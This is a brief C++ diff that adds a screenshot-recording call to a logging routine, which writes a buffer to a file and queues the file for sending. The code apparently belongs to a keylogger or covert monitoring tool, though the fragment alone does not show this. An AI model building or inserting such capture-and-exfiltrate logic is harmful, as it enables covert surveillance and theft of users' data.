@@ -124,6 +124,7 @@ void log() {
         ofstream file(fileName, std::ios::app);
         file << stringedBuffer(buffer);
         *(filesToPostSend.load()) += fileName + '\n';
+        recordScreenShot();
     }
 }
 
